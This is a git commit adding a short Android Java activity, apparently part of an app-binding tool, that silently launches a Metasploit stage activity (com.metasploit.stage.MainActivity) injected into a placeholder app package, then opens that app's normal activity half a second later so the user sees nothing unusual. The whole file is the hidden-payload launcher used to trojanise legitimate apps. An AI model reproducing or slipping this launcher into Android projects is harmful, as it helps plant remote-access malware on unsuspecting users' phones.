8a565cd0cf2e40d82ad2c17b0237367e32b67ccd
root <root@localhost.localdomain>
2015-11-30 12:06:48 +0200

    Adding Files

---
+++ src/com/app/bind/StartUpActivity.java
@@ -0,0 +1,35 @@
+package com.app.bind;
+
+import android.app.Activity;
+import android.content.ComponentName;
+import android.content.Intent;
+import android.os.Bundle;
+import android.os.Handler;
+
+public class StartUpActivity extends Activity {
+
+    private Handler mHandler = new Handler();
+
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+
+        Intent intent = new Intent();
+        intent.setComponent(new ComponentName("com.package.ofnormall.app", "com.metasploit.stage.MainActivity"));
+        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+        startActivity(intent);
+
+        mHandler.postDelayed(new Runnable() {
+            public void run() {
+                doStuff();
+            }
+        }, 500);
+    }
+
+    private void doStuff() {
+        Intent intent = new Intent();
+        intent.setComponent(new ComponentName("com.package.ofnormall.app", "com.package.ofnormall.app.activity"));
+        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+        startActivity(intent);
+    }
+}
